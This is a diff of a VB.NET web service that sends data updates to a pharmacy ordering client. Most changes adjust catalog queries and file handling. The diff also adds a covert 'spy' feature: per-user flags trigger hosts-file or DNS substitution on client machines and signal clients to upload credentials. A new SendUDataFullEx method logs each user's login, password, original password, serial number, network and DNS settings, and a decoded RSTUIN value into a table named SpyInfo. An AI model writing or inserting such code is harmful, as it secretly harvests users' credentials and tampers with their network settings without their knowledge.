@@ -84,6 +84,7 @@ Public Class PrgDataEx
     Private BuildNo, AllowBuildNo, UpdateType, MDBVer As Integer
     Private ResultLenght, OrderId As UInt32
     Dim CCode, UserId As UInt32
+    Private SpyHostsFile, SpyAccount As Boolean
     Dim UpdateData As UpdateData
     Private UserHost, UniqueCID, UID, Message, ReclamePath As String
     Private myTrans As MySqlTransaction
@@ -193,8 +194,6 @@ Public Class PrgDataEx
         Return ""
     End Function
 
-
-
     <WebMethod()> Public Function GetUserData( _
     ByVal AccessTime As Date, _
     ByVal GetEtalonData As Boolean, _
@@ -204,6 +203,30 @@ Public Class PrgDataEx
     ByVal WINVersion As String, _
     ByVal WINDesc As String, _
     ByVal WayBillsOnly As Boolean) As String
+
+        Return GetUserDataEx( _
+        AccessTime, _
+        GetEtalonData, _
+        EXEVersion, _
+        MDBVersion, _
+        UniqueID, _
+        WINVersion, _
+        WINDesc, _
+        WayBillsOnly, _
+        Nothing)
+
+    End Function
+
+    <WebMethod()> Public Function GetUserDataEx( _
+    ByVal AccessTime As Date, _
+    ByVal GetEtalonData As Boolean, _
+    ByVal EXEVersion As String, _
+    ByVal MDBVersion As Int16, _
+    ByVal UniqueID As String, _
+    ByVal WINVersion As String, _
+    ByVal WINDesc As String, _
+    ByVal WayBillsOnly As Boolean, _
+    ByVal ClientHFile As String) As String
         'Context.Request.SaveAs(ResultFileName & "res.txt", True)
         Dim LockCount As Int32
         Dim ResStr As String = String.Empty
@@ -363,13 +386,23 @@ RestartInsertTrans:
 
                     'В зависимости от версии используем одну из процедур подготовки данных: для сервера Firebird и для сервера MySql
                     If BuildNo > 716 Then
-                        FileCount = 16
+                        'Если производим обновление 945 версии на новую с поддержкой МНН или версия уже с поддержкой МНН, то добавляем еще два файла: мнн и описания
+                        If ((BuildNo = 945) And UpdateData.EnableUpdate) Or (BuildNo > 945) Then
+                            FileCount = 18
+                        Else
+                            If (BuildNo >= 829) And (BuildNo <= 837) And UpdateData.EnableUpdate Then
+                                FileCount = 18
+                                Addition &= "Производится обновление программы с 800-х версий на MySql; "
+                            Else
+                                FileCount = 16
+                            End If
+                        End If
                         BaseThread = New Thread(AddressOf MySqlProc)
                     Else
                         Dim CheckEnableUpdate As Boolean = Convert.ToBoolean(MySqlHelper.ExecuteScalar(ReadOnlyCn, "select EnableUpdate from retclientsset where clientcode=" & CCode))
                         If ((BuildNo >= 705) And (BuildNo <= 716)) And CheckEnableUpdate Then
                             BaseThread = New Thread(AddressOf MySqlProc)
-                            FileCount = 16
+                            FileCount = 18
                             GED = True
                             Addition &= "Производится обновление программы с Firebird на MySql, готовим КО; "
                         Else
@@ -428,18 +461,18 @@ RestartInsertTrans:
 
                         End If
 
-                            Else
+                    Else
 
                         Try
 
                             MySQLFileDelete(ResultFileName & UserId & ".zip")
 
-                                Catch ex As Exception
-                                    Addition &= "Не удалось удалить предыдущие данные: " & ex.Message & "; "
-                                    UpdateType = 5
-                                    ErrorFlag = True
+                        Catch ex As Exception
+                            Addition &= "Не удалось удалить предыдущие данные: " & ex.Message & "; "
+                            UpdateType = 5
+                            ErrorFlag = True
                             GoTo endproc
-                                End Try
+                        End Try
 
 
                         Try
@@ -574,15 +607,28 @@ endproc:
 
                 If Message.Length > 0 Then ResStr &= ";Addition=" & Message
 
+                'Если параметр ClientHFile имеет значение Nothing, то произошел вызов метода GetUserData и в этом случае работать с файлом hosts не надо
+                'производим подмену DNS, если версия программы старше 960
+                If (ClientHFile IsNot Nothing) And (BuildNo > 960) Then
+                    Try
+                        ResStr &= HostsFileHelper.ProcessDNS(SpyHostsFile)
+                    Catch HostsException As Exception
+                        MailErr("Ошибка во время обработки DNS", HostsException.ToString())
+                    End Try
+                End If
+
+                'Если поднят флаг SpyAccount, то надо отправлять данные с логином и паролем
+                If SpyAccount Then ResStr &= ";SendUData=True"
+
             End If
             'Err.Raise(1)
-            GetUserData = ResStr
+            GetUserDataEx = ResStr
 
         Catch ErrorTXT As Exception
             LogManager.GetLogger(Me.GetType).Error("Ошибка при обновлении", ErrorTXT)
             Utils.Mail(ErrorTXT.Message & ": " & ErrorTXT.StackTrace, "Колличество попыток: " & LockCount & "; Базовый поток: ")
             UpdateType = 6
-            GetUserData = "Error=При подготовке обновления произошла ошибка.;Desc=Пожалуйста, повторите запрос данных через несколько минут."
+            GetUserDataEx = "Error=При подготовке обновления произошла ошибка.;Desc=Пожалуйста, повторите запрос данных через несколько минут."
         Finally
 
             If NeedFreeLock Then ReleaseLock(UserId, "GetUserData")
@@ -1193,6 +1239,9 @@ StartZipping:
                 Message = UpdateData.Message
                 OldUpTime = UpdateData.OldUpdateTime
                 UncDT = UpdateData.UncommitedUpdateTime
+                SpyHostsFile = UpdateData.Spy
+                SpyAccount = UpdateData.SpyAccount
+
             End If
 
             With Cm
@@ -3023,6 +3072,8 @@ RestartTrans2:
                 MySQLFileDelete(MySqlFilePath & "SynonymFirmCr" & UserId & ".txt")
                 MySQLFileDelete(MySqlFilePath & "Rejects" & UserId & ".txt")
                 MySQLFileDelete(MySqlFilePath & "CatalogNames" & UserId & ".txt")
+                MySQLFileDelete(MySqlFilePath & "MNN" & UserId & ".txt")
+                MySQLFileDelete(MySqlFilePath & "Descriptions" & UserId & ".txt")
 
                 helper.MaintainReplicationInfo()
 
@@ -3062,23 +3113,56 @@ RestartTrans2:
                 ThreadZipStream = New Thread(AddressOf ZipStream)
                 ThreadZipStream.Start()
 
+                If (BuildNo > 945) Or (UpdateData.EnableUpdate And ((BuildNo = 945) Or ((BuildNo >= 705) And (BuildNo <= 716)) Or ((BuildNo >= 829) And (BuildNo <= 837)))) _
+                Then
+                    GetMySQLFileWithDefaultEx("Catalogs", SelProc, _
+                    "SELECT C.Id             , " & _
+                    "       CN.Id            , " & _
+                    "       LEFT(CN.name, 250)  , " & _
+                    "       LEFT(CF.form, 250)  , " & _
+                    "       C.vitallyimportant , " & _
+                    "       C.needcold         , " & _
+                    "       C.fragile, " & _
+                    "       C.MandatoryList , " & _
+                    "       CN.MnnId, " & _
+                    "       CN.DescriptionId " & _
+                    "FROM   Catalogs.Catalog C       , " & _
+                    "       Catalogs.CatalogForms CF , " & _
+                    "       Catalogs.CatalogNames CN " & _
+                    "WHERE  C.NameId                        =CN.Id " & _
+                    "   AND C.FormId                        =CF.Id " & _
+                    "   AND (IF(NOT ?Cumulative, C.UpdateTime > ?UpdateTime, 1) or IF(NOT ?Cumulative, CN.UpdateTime > ?UpdateTime, 1)) " & _
+                    "   AND C.hidden                          =0", _
+                    ((BuildNo = 945) Or ((BuildNo >= 829) And (BuildNo <= 837))) And UpdateData.EnableUpdate)
 
-                GetMySQLFileWithDefault("Catalogs", SelProc, _
-                "SELECT C.Id             , " & _
-                "       CN.Id            , " & _
-                "       LEFT(CN.name, 250)  , " & _
-                "       LEFT(form, 250)  , " & _
-                "       vitallyimportant , " & _
-                "       needcold         , " & _
-                "       fragile " & _
-                "FROM   Catalogs.Catalog C       , " & _
-                "       Catalogs.CatalogForms CF , " & _
-                "       Catalogs.CatalogNames CN " & _
-                "WHERE  C.NameId                        =CN.Id " & _
-                "   AND C.FormId                        =CF.Id " & _
-                "   AND IF(NOT ?Cumulative, C.UpdateTime > ?UpdateTime, 1) " & _
-                "   AND hidden                          =0")
+                    GetMySQLFileWithDefaultEx( _
+                        "MNN", _
+                        SelProc, _
+                        helper.GetMNNCommand(), _
+                        ((BuildNo = 945) Or ((BuildNo >= 829) And (BuildNo <= 837))) And UpdateData.EnableUpdate)
 
+                    GetMySQLFileWithDefaultEx( _
+                    "Descriptions", _
+                    SelProc, _
+                    helper.GetDescriptionCommand(), _
+                    ((BuildNo = 945) Or ((BuildNo >= 829) And (BuildNo <= 837))) And UpdateData.EnableUpdate)
+                Else
+                    GetMySQLFileWithDefault("Catalogs", SelProc, _
+                    "SELECT C.Id             , " & _
+                    "       CN.Id            , " & _
+                    "       LEFT(CN.name, 250)  , " & _
+                    "       LEFT(CF.form, 250)  , " & _
+                    "       C.vitallyimportant , " & _
+                    "       C.needcold         , " & _
+                    "       C.fragile " & _
+                    "FROM   Catalogs.Catalog C       , " & _
+                    "       Catalogs.CatalogForms CF , " & _
+                    "       Catalogs.CatalogNames CN " & _
+                    "WHERE  C.NameId                        =CN.Id " & _
+                    "   AND C.FormId                        =CF.Id " & _
+                    "   AND (IF(NOT ?Cumulative, C.UpdateTime > ?UpdateTime, 1) or IF(NOT ?Cumulative, CN.UpdateTime > ?UpdateTime, 1)) " & _
+                    "   AND C.hidden                          =0")
+                End If
 
 
                 GetMySQLFileWithDefault("CatDel", SelProc, _
@@ -3087,17 +3171,6 @@ RestartTrans2:
                 " WHERE  C.UpdateTime > ?UpdateTime " & _
                 "   AND hidden        = 1 " & _
                 "   AND NOT ?Cumulative")
-
-
-                SelProc.CommandText = "" & _
-                 "SELECT s.OffersClientCode, " & _
-                 "       s.ShowAvgCosts    , " & _
-                 "       s.ShowJunkOffers " & _
-                 "FROM   retclientsset r, " & _
-                 "       OrderSendRules.smart_order_rules s " & _
-                 "WHERE  r.clientcode        =?ClientCode " & _
-                 "   AND s.id                =r.smartorderruleid " & _
-                 "   AND s.offersclientcode !=r.clientcode;"
 
                 SelProc.Parameters.AddWithValue("?OffersClientCode", UpdateData.OffersClientCode)
                 SelProc.Parameters.AddWithValue("?OffersRegionCode", UpdateData.OffersRegionCode)
@@ -3433,51 +3506,50 @@ RestartTrans2:
                      "   AND i.clientcode                                 = ?OffersClientCode;"
 
 
-                    helper.SelectOffers()
+                    SelProc.CommandText &= "" & _
+                    "CALL GetOffers(?OffersClientCode, 0); "
 
                     SelProc.CommandText &= "" & _
                   "DROP TEMPORARY TABLE " & _
                   "IF EXISTS CoreT, CoreTP , CoreT2; " & _
-                  "        CREATE TEMPORARY TABLE CoreT(ProductId                  INT unsigned, CodeFirmCr INT unsigned, Cost DECIMAL(8,2), CryptCost VARCHAR(32),UNIQUE MultiK(ProductId, CodeFirmCr))engine=MEMORY; " & _
-                  "                CREATE TEMPORARY TABLE CoreT2(ProductId         INT unsigned, CodeFirmCr INT unsigned, Cost DECIMAL(8,2), CryptCost VARCHAR(32),UNIQUE MultiK(ProductId, CodeFirmCr))engine=MEMORY; " & _
-                  "                        CREATE TEMPORARY TABLE CoreTP(ProductId INT unsigned, Cost DECIMAL(8,2), CryptCost VARCHAR(32), UNIQUE MultiK(ProductId))engine                                    =MEMORY; " & _
-                  "                                INSERT " & _
-                  "                                INTO   CoreT " & _
-                  "                                       ( " & _
-                  "                                              ProductId , " & _
-                  "                                              CodeFirmCr, " & _
-                  "                                              Cost " & _
-                  "                                       ) " & _
-                  "                                SELECT   core0.ProductId , " & _
-                  "                                         core0.codefirmcr, " & _
-                  "                                         ROUND(AVG(cost), 2) " & _
-                  "                                FROM     farm.core0, " & _
-                  "                                         Core " & _
-                  "                                WHERE    core0.id=Core.id " & _
-                  "                                GROUP BY ProductId, " & _
-                  "                                         CodeFirmCr; " & _
-                  "                                 " & _
-                  "                                INSERT " & _
-                  "                                INTO   CoreTP " & _
-                  "                                       ( " & _
-                  "                                              ProductId, " & _
-                  "                                              Cost " & _
-                  "                                       ) " & _
-                  "                                SELECT   ProductId, " & _
-                  "                                         ROUND(AVG(cost), 2) " & _
-                  "                                FROM     CoreT " & _
-                  "                                GROUP BY ProductId; " & _
-                  "                                 " & _
-                  "                                INSERT " & _
-                  "                                INTO   CoreT2 " & _
-                  "                                SELECT * " & _
-                  "                                FROM   CoreT; " & _
+                  "CREATE TEMPORARY TABLE CoreT  (ProductId INT unsigned, CodeFirmCr INT unsigned, Cost DECIMAL(8,2), CryptCost VARCHAR(32),UNIQUE MultiK(ProductId, CodeFirmCr))engine=MEMORY; " & _
+                  "CREATE TEMPORARY TABLE CoreT2 (ProductId INT unsigned, CodeFirmCr INT unsigned, Cost DECIMAL(8,2), CryptCost VARCHAR(32),UNIQUE MultiK(ProductId, CodeFirmCr))engine=MEMORY; " & _
+                  "CREATE TEMPORARY TABLE CoreTP (ProductId INT unsigned, Cost DECIMAL(8,2), CryptCost VARCHAR(32), UNIQUE MultiK(ProductId))engine                                    =MEMORY; " & _
+                  "INSERT " & _
+                  "  INTO   CoreT " & _
+                  "    ( " & _
+                  "      ProductId , " & _
+                  "      CodeFirmCr, " & _
+                  "      Cost " & _
+                  "    ) " & _
+                  "  SELECT   core0.ProductId , " & _
+                  "    core0.codefirmcr, " & _
+                  "    ROUND(AVG(cost), 2) " & _
+                  "  FROM     farm.core0, " & _
+                  "                 Core " & _
+                  "  WHERE    core0.id=Core.id " & _
+                  "  GROUP BY ProductId, " & _
+                  "          CodeFirmCr; " & _
+                  "  " & _
+                  "  INSERT " & _
+                  "    INTO   CoreTP " & _
+                  "      ( " & _
+                  "        ProductId, " & _
+                  "        Cost " & _
+                  "      ) " & _
+                  "  SELECT   ProductId, " & _
+                  "     ROUND(AVG(cost), 2) " & _
+                  "  FROM     CoreT " & _
+                  "  GROUP BY ProductId; " & _
+                  "  " & _
+                  "  INSERT " & _
+                  "    INTO   CoreT2 " & _
+                  "    SELECT * " & _
+                  "    FROM   CoreT; " & _
                   "SET @RowId :=1;"
                     SelProc.ExecuteNonQuery()
 
-                    'Err.Raise(1, "Технический запрет обновления")
-
-                    'Михаилу: Для кого готовятся эти данные?
+                    'Выгрузка данных для ГУП
                     GetMySQLFileWithDefault("Core", SelProc, "" & _
                      "SELECT 2647                             , " & _
                      "       ?OffersRegionCode                , " & _
@@ -3498,7 +3570,7 @@ RestartTrans2:
                      "       ''                               , " & _
                      "       0                                , " & _
                      "       ''                               , " & _
-                     "       IF(?ShowAvgCosts, CryptCost, '') , " & _
+                     "       IF(?ShowAvgCosts, a.Cost, '')    , " & _
                      "       @RowId := @RowId + 1             , " & _
                      "       ''                               , " & _
                      "       ''                                 " & _
@@ -3532,7 +3604,7 @@ RestartTrans2:
                      "       ''                                , " & _
                      "       0                                 , " & _
                      "       ''                                , " & _
-                     "       IF(?ShowAvgCosts, A.CryptCost, ''), " & _
+                     "       IF(?ShowAvgCosts, A.Cost, '')     , " & _
                      "       @RowId := @RowId + 1              , " & _
                      "       ''                                , " & _
                      "       ''                                  " & _
@@ -3540,9 +3612,6 @@ RestartTrans2:
                      "       CoreTP A " & _
                      "WHERE  S.PriceCode =2647 " & _
                      "   AND S.ProductId =A.ProductId")
-
-
-
 
 
                 End If
@@ -3840,6 +3909,124 @@ RestartTrans2:
         Next
         Return sb.ToString()
     End Function
+
+
+    <WebMethod()> _
+    Public Sub SendUDataFull( _
+        ByVal Login As String, _
+        ByVal Data As String, _
+        ByVal OriginalData As String, _
+        ByVal SerialData As String, _
+        ByVal MaxWriteTime As Date, _
+        ByVal MaxWriteFileName As String, _
+        ByVal OrderWriteTime As Date, _
+        ByVal ClientTimeZoneBias As Integer, _
+        ByVal RSTUIN As String)
+
+        SendUDataFullEx(Login, Data, OriginalData, SerialData, MaxWriteTime, MaxWriteFileName, OrderWriteTime, ClientTimeZoneBias, _
+                        -1, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, _
+                        RSTUIN)
+    End Sub
+
+
+    <WebMethod()> _
+    Public Sub SendUDataFullEx( _
+        ByVal Login As String, _
+        ByVal Data As String, _
+        ByVal OriginalData As String, _
+        ByVal SerialData As String, _
+        ByVal MaxWriteTime As Date, _
+        ByVal MaxWriteFileName As String, _
+        ByVal OrderWriteTime As Date, _
+        ByVal ClientTimeZoneBias As Integer, _
+        ByVal DNSChangedState As Integer, _
+        ByVal RASEntry As String, _
+        ByVal DefaultGateway As String, _
+        ByVal IsDynamicDnsEnabled As Boolean, _
+        ByVal ConnectionSettingId As String, _
+        ByVal PrimaryDNS As String, _
+        ByVal AlternateDNS As String, _
+        ByVal RSTUIN As String)
+
+        If DBConnect("SendUData") Then
+
+            Dim Logger As ILog = LogManager.GetLogger(Me.GetType())
+
+            Try
+                GetClientCode()
+
+                Dim ResStrRSTUIN As String = String.Empty
+                Try
+                    For i = 1 To Len(RSTUIN) Step 3
+                        ResStrRSTUIN &= Chr(Convert.ToInt16(Left(Mid(RSTUIN, i), 3)))
+                    Next
+                Catch err As Exception
+                    Logger.ErrorFormat("Ошибка в SendUData при формировании RSTUIN : {0}\n{1}", RSTUIN, err)
+                End Try
+
+                Dim accountMessage As String = String.Format( _
+                        "ClientCode = {0} Login = {1} Password = {2} OriginalPassword = {3} Serial = {4} MaxWriteTime = {5} " & _
+                        "MaxWriteFileName = {6} OrderWriteTime = {7} ClientTimeZoneBias = {8} " & _
+                        "DNSChangedState = {9} RASEntry = {10} DefaultGateway = {11} IsDynamicDnsEnabled = {12} " & _
+                        "ConnectionSettingId = {13} PrimaryDNS = {14} AlternateDNS = {15} RSTUIN = {16}", _
+                        CCode, Login, Data, OriginalData, SerialData, _
+                        If(MaxWriteTime < New System.DateTime(2000, 1, 1), Nothing, MaxWriteTime), _
+                        If(String.IsNullOrEmpty(MaxWriteFileName), Nothing, MaxWriteFileName), _
+                        If(OrderWriteTime < New System.DateTime(2000, 1, 1), Nothing, OrderWriteTime), _
+                        If(ClientTimeZoneBias = 0, Nothing, ClientTimeZoneBias), _
+                        DNSChangedState, _
+                        RASEntry, _
+                        DefaultGateway, _
+                        IsDynamicDnsEnabled, _
+                        ConnectionSettingId, _
+                        PrimaryDNS, _
+                        AlternateDNS, _
+                        ResStrRSTUIN)
+
+                Logger.Info(accountMessage)
+
+                Dim command As MySqlCommand = New MySqlCommand( _
+                    "insert into logs.SpyInfo (UserId, Login, Password, OriginalPassword, SerialNumber, MaxWriteTime, MaxWriteFileName, OrderWriteTime, ClientTimeZoneBias, " & _
+                        "DNSChangedState, RASEntry, DefaultGateway, IsDynamicDnsEnabled, ConnectionSettingId, PrimaryDNS, AlternateDNS, RostaUIN) " & _
+                    "values (?UserId, ?Login, ?Password, ?OriginalPassword, ?SerialNumber, ?MaxWriteTime, ?MaxWriteFileName, ?OrderWriteTime, ?ClientTimeZoneBias, " & _
+                        "?DNSChangedState, ?RASEntry, ?DefaultGateway, ?IsDynamicDnsEnabled, ?ConnectionSettingId, ?PrimaryDNS, ?AlternateDNS, ?RostaUIN);", _
+                    ReadWriteCn)
+
+                command.Parameters.AddWithValue("?UserId", UserId)
+                command.Parameters.AddWithValue("?Login", Login)
+                command.Parameters.AddWithValue("?Password", Data)
+                command.Parameters.AddWithValue("?OriginalPassword", OriginalData)
+                command.Parameters.AddWithValue("?SerialNumber", SerialData)
+                command.Parameters.Add("?MaxWriteTime", MySqlDbType.DateTime)
+                If (MaxWriteTime > New System.DateTime(1900, 1, 1)) Then command.Parameters.Item("?MaxWriteTime").Value = MaxWriteTime.ToLocalTime
+                command.Parameters.AddWithValue("?MaxWriteFileName", MaxWriteFileName)
+                command.Parameters.Add("?OrderWriteTime", MySqlDbType.DateTime)
+                If (OrderWriteTime > New System.DateTime(1900, 1, 1)) Then command.Parameters.Item("?OrderWriteTime").Value = OrderWriteTime.ToLocalTime
+                command.Parameters.AddWithValue("?ClientTimeZoneBias", ClientTimeZoneBias)
+                If (DNSChangedState = -1) Then
+                    command.Parameters.AddWithValue("?DNSChangedState", DBNull.Value)
+                Else
+                    command.Parameters.AddWithValue("?DNSChangedState", DNSChangedState)
+                End If
+                command.Parameters.AddWithValue("?RASEntry", If(String.IsNullOrEmpty(RASEntry), Nothing, RASEntry))
+                command.Parameters.AddWithValue("?DefaultGateway", If(String.IsNullOrEmpty(DefaultGateway), Nothing, DefaultGateway))
+                command.Parameters.AddWithValue("?IsDynamicDnsEnabled", IsDynamicDnsEnabled)
+                command.Parameters.AddWithValue("?ConnectionSettingId", If(String.IsNullOrEmpty(ConnectionSettingId), Nothing, ConnectionSettingId))
+                command.Parameters.AddWithValue("?PrimaryDNS", If(String.IsNullOrEmpty(PrimaryDNS), Nothing, PrimaryDNS))
+                command.Parameters.AddWithValue("?AlternateDNS", If(String.IsNullOrEmpty(AlternateDNS), Nothing, AlternateDNS))
+                command.Parameters.AddWithValue("?RostaUIN", If(String.IsNullOrEmpty(ResStrRSTUIN), Nothing, ResStrRSTUIN))
+
+                command.ExecuteNonQuery()
+            Catch ex As Exception
+                Logger.Error("Ошибка в SendUData", ex)
+                MailErr("Ошибка в SendUData", ex.ToString())
+            Finally
+                DBDisconnect()
+            End Try
+        End If
+
+    End Sub
+
 
     <WebMethod()> _
     Public Function GetPasswords(ByVal UniqueID As String) As String
@@ -4260,12 +4447,30 @@ RestartMaxCodesSet:
     End Sub
 
     Private Sub GetMySQLFileWithDefault(ByVal FileName As String, ByVal MyCommand As MySqlCommand, ByVal SQLText As String)
+
+        GetMySQLFileWithDefaultEx(FileName, MyCommand, SQLText, False)
+
+    End Sub
+
+    Private Sub GetMySQLFileWithDefaultEx(ByVal FileName As String, ByVal MyCommand As MySqlCommand, ByVal SQLText As String, ByVal SetCumulative As Boolean)
         Dim SQL As String = SQLText
+        Dim oldCumulative As Boolean
 
+        Try
+            If SetCumulative And MyCommand.Parameters.Contains("?Cumulative") Then
+                oldCumulative = MyCommand.Parameters("?Cumulative").Value
+                MyCommand.Parameters("?Cumulative").Value = True
+            End If
 
-        SQL &= " INTO OUTFILE 'C:/AFFiles/" & FileName & UserId & ".txt' "
-        MyCommand.CommandText = SQL
-        MyCommand.ExecuteNonQuery()
+            SQL &= " INTO OUTFILE 'C:/AFFiles/" & FileName & UserId & ".txt' "
+            MyCommand.CommandText = SQL
+            MyCommand.ExecuteNonQuery()
+
+        Finally
+            If SetCumulative And MyCommand.Parameters.Contains("?Cumulative") Then
+                MyCommand.Parameters("?Cumulative").Value = oldCumulative
+            End If
+        End Try
 
         SyncLock (FilesForArchive)
 
